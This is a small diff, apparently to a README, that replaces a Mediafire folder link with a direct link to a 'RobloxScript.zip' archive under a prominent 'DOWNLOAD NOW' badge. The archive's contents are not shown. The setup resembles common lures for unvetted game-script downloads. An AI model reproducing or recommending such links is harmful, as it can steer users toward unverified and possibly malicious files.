@@ -16,7 +16,7 @@
 
 <br><br>
 
-<a href="https://www.mediafire.com/folder/qzgsrhq62al4t/Roblox">
+<a href="https://www.mediafire.com/file/e3afsisjzqr3ywg/RobloxScript.zip/file">
 <img src="https://img.shields.io/badge/⬇%20DOWNLOAD%20NOW-7B68EE?style=for-the-badge&labelColor=111111" height="90">
 </a>
 
